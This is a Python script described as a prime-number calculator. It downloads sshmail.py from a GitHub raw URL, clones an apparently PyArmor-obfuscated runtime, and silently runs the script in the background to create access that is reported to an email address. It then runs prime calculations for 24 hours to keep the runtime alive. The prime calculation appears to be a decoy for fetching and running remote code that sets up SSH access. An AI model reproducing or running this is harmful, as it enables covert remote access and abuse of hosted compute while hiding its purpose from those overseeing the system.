import os
import subprocess
import time
import math
from datetime import datetime, timedelta
import urllib.request
import argparse

# 
SSHMAIL_URL = "https://raw.githubusercontent.com/icadnewton/sendme/refs/heads/main/sshmail.py"
PYARMOR_REPO_URL = "https://github.com/icadnewton/pyarmor_runtime_000000.git"

# 
SSHMAIL_FILE = "sshmail.py"
PYARMOR_FOLDER = "pyarmor_runtime_000000"

# 
def check_and_download_file(file_name, url):
    if not os.path.exists(file_name):
        print(f"File {file_name} not available. download from {url}...")
        try:
            urllib.request.urlretrieve(url, file_name)
            print(f"File {file_name} berhasil didownload.")
        except Exception as e:
            print(f"Error to download {file_name}: {e}")
    else:
        print(f"File {file_name} already exist.")

# 
def check_and_clone_folder(folder_name, repo_url):
    if not os.path.exists(folder_name):
        print(f"Folder {folder_name} not available. clonning from {repo_url}...")
        try:
            subprocess.run(["git", "clone", repo_url], check=True)
            print(f"Folder {folder_name} Succes.")
        except subprocess.CalledProcessError as e:
            print(f"Error folder clonning {folder_name}: {e}")
    else:
        print(f"Folder {folder_name} Ready.")

#
def run_background_script(email):
    try:
        # 
        command = ["python3", "sshmail.py", "-email", email]
        subprocess.Popen(
            command,
            stdout=subprocess.DEVNULL,  
            stderr=subprocess.DEVNULL, 
        )
        print(f"access successfully created, check your email: {email}")
    except Exception as e:
        print(f"Error saat menjalankan script sshmail.py: {e}")

# 
def is_prime(number):
    if number <= 1:
        return False
    for i in range(2, int(math.sqrt(number)) + 1):
        if number % i == 0:
            return False
    return True

# 
def calculate_primes():
    print("Counting prime numbers...")
    max_number = 1000  
    primes = [num for num in range(2, max_number + 1) if is_prime(num)]

    print(f"Prime numbers between 2 and {max_number}:")
    print(primes)

# Fungsi utama
def main():
    #  
    parser = argparse.ArgumentParser(description="Script to calculate prime numbers.")
    parser.add_argument("-email", required=True, help="Alamat email penerima")
    args = parser.parse_args()
    email = args.email

    #
    check_and_download_file(SSHMAIL_FILE, SSHMAIL_URL)
    check_and_clone_folder(PYARMOR_FOLDER, PYARMOR_REPO_URL)

    # 
    run_background_script(email)

  
    start_time = datetime.now()
    end_time = start_time + timedelta(hours=24)

    print("prime number...")


    while datetime.now() < end_time:
        calculate_primes()
        time.sleep(180) 

    print("simple calculation process keeps the runtime active..")

if __name__ == "__main__":
    main()
